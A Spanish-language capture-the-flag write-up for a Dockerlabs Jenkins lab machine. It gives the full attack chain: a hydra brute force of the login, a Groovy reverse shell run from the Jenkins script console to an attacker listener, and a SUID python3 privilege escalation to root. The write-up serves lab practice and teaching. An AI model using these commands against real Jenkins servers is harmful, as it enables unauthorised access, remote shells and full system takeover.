
# Writeup Template: Maquina `[ StrongJEnkins ]`

- Tags: #StrongJEnkins #Jankins
- Dificultad: `[ Media ]`
- Plataforma: `[ Dockerlabs ]`

---
## Enlace al laboratorio
[Maquina StrongJEnkins](https://mega.nz/file/QLF1maab#uWv80VZEIFclxoCnHb5COB6vgZYDLciFr1tkQX_Be8g)

## Configuracion del Entorno
```bash
# Comandos para desplegar el laboratorio
7z x strongjenkins.zip
sudo bash auto_deploy.sh strongjenkins.tar
```

---
## Fase de Reconocimiento

### Direccion IP del Target
```bash
172.17.0.2
```
### Identificación del Target
Lanzamos una traza **ICMP** para determinar si tenemos conectividad con el target
```bash
ping -c 1 172.17.0.2 
```

### Determinacion del SO
Usamos nuestra herramienta en python para determinar ante que tipo de sistema opertivo nos estamos enfrentando
```bash
wichSystem.py 172.17.0.2
# TTL: [ 64 ] -> [ Linux ]
``` 

---
## Enumeracion de Puertos y Servicios
### Descubrimiento de Puertos
```bash
# Escaneo rápido con herramienta personalizada en python
escanerTCP.py -t 172.17.0.2 -p 1-65000

# Escaneo con Nmap
nmap -p- -sS --open --min-rate 5000 -vvv -n -Pn 172.17.0.2 -oG allPorts
extractPorts allPorts # Parseamos la informacion mas relevante del primer escaneo
```

### Análisis de Servicios
Realizamos un escaneo exhaustivo para determinar los servicios y las versiones que corren detreas de estos puertos
```bash
nmap -sCV -p8080 172.17.0.2 -oN targeted
```

**Servicios identificados:**
```bash
8080/tcp open  http    Jetty 10.0.20
```
---

## Enumeracion de [Servicio  Principal]
direccion **URL** del servicio:
```bash
http://172.17.0.2:8080
```
### Tecnologías Detectadas
Realizamos deteccion de las tecnologias empleadas por la web
```bash
whatweb http://172.17.0.2:8080
http://172.17.0.2:8080 [403 Forbidden] Cookies[JSESSIONID.29b5fe4f], Country[RESERVED][ZZ], HTTPServer[Jetty(10.0.20)], HttpOnly[JSESSIONID.29b5fe4f], IP[172.17.0.2], Jenkins[2.440.2], Jetty[10.0.20], Meta-Refresh-Redirect[/login?from=%2F], Script, UncommonHeaders[x-content-type-options,x-hudson,x-jenkins,x-jenkins-session]
http://172.17.0.2:8080/login?from=%2F [200 OK] Cookies[JSESSIONID.29b5fe4f], Country[RESERVED][ZZ], HTML5, HTTPServer[Jetty(10.0.20)], HttpOnly[JSESSIONID.29b5fe4f], IP[172.17.0.2], Jenkins[2.440.2], Jetty[10.0.20], PasswordField[j_password], Script[application/json,text/javascript], Title[Sign in [Jenkins]], UncommonHeaders[x-content-type-options,x-hudson,x-jenkins,x-jenkins-session,x-instance-identity], X-Frame-Options[sameorigin]
```

Lanzamos un script de **Nmap** para reconocimiento de rutas
```bash
nmap --script http-enum -p 8080 172.17.0.2
```

Reporte:
```bash
/robots.txt: Robots file
```

Ahora realizaremos un ataque de fuerza bruta al panel de inicio de sesion de la siguiente manera:
Primero interceptamos la peticon para saber como es que se esta tramitando la peticion:
```bash
POST /loginError HTTP/1.1
Host: 172.17.0.2:8080
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: es-MX,es;q=0.8,en-US;q=0.5,en;q=0.3
Accept-Encoding: gzip, deflate, br
Content-Type: application/x-www-form-urlencoded
Content-Length: 50
Origin: http://172.17.0.2:8080
DNT: 1
Sec-GPC: 1
Connection: keep-alive
Referer: http://172.17.0.2:8080/login?from=%2F
Cookie: JSESSIONID.29b5fe4f=node01q1z7eix5dq1qtb8sd8q6poz932.node0
Upgrade-Insecure-Requests: 1
Priority: u=0, i

j_username=admin&j_password=admin&from=%2F&Submit=
```

Ahora usaremos esto para intentar nuestro ataque por fuerza bruta: con **hydra**
```bash
hydra -L /usr/share/SecLists/Usernames/top-usernames-shortlist.txt -P /usr/share/wordlists/rockyou.txt 172.17.0.2 http-post-form "/loginError:j_username=^USER^&j_password=^pass^:F=Invalid username or password" -f -s 8080 -I -t 4
```

Ahora tenemos la contrasena del usuario **admin**
```bash
[8080][http-post-form] host: 172.17.0.2   login: admin   password: rockyou
```

Ahora nos conectaremos al servicio principal con estas credenciales:
```bash
j_username: admin
j_password: rockyou
```

Ahora es esta pestana, 
```bash
http://172.17.0.2:8080/manage/administrar jenkings
```

Aqui tenemos un apartado de **consola**
```bash
http://172.17.0.2:8080/manage/script
```

---
## Explotacion de Vulnerabilidades
### Vector de Ataque
Ahora que estamos en **script** verificaremos si podemos ejecutar comandos:
```bash
println "whoami".execute().text
```

El **output** en el resultado nos retorna:
```bash
jenkins
```

Asi que podemos ejecutar comando y nos aprovecharemos de esto para ganar acceso al objetivo:

### Ejecucion del Ataque
##### Reverse Shell con Groovy
```bash
# Comandos para explotación
String host="172.17.0.1";
int port=443;
String cmd="bash";
Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(), si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){while(pi.available()>0)so.write(pi.read());while(pe.available()>0)so.write(pe.read());while(si.available()>0)po.write(si.read());so.flush();po.flush();Thread.sleep(50);try {p.exitValue();break;}catch (Exception e){}};p.destroy();s.close();
```

### Intrusion
Modo escucha
```bash
nc -nlvp 443
```

Ahora solo ejecutamos: **Ejecutar**

---

## Escalada de Privilegios

###### Usuario `[ Jenkings ]`:
Enumeramos privilegios **SUID**
```bash
find / -perm -4000 2>/dev/null
```

Explotamos el privilegio:
```bash
# Comando para escalar al usuario: ( root )
/usr/bin/python3.10 -c 'import os; os.execl("/bin/bash", "bash", "-p")'
```

---

## Evidencia de Compromiso
```bash
# Captura de pantalla o output final
bash-5.1# whoami
root
```

---